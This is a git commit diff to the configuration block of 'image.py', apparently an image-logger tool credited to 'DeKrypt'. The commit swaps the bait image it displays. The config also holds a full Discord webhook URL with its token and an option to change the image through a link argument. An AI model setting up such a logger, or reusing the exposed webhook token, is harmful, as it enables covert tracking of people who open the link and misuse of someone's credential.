5d3a89cda6c035ff967ad095a1ae7dbafacd98e7
Mechu592 <kgmunoz1973@gmail.com>
2025-06-21 04:55:47 -0300

    image.py

--- image.py
+++ image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1385890480428023808/0yigZsxZItKe70qnkBOY7gOSW5FziM9oGn9DpT-ruzXSsS94kB6OxTSiBlfcKR6Iqpdc",
-    "image": "https://imageio.forbes.com/specials-images/imageserve/5d35eacaf1176b0008974b54/0x0.jpg?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
+    "image": "https://vladware.net/wp-content/uploads/2023/08/Bliss-fondo-de-pantalla-de-Windows-XP.webp", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
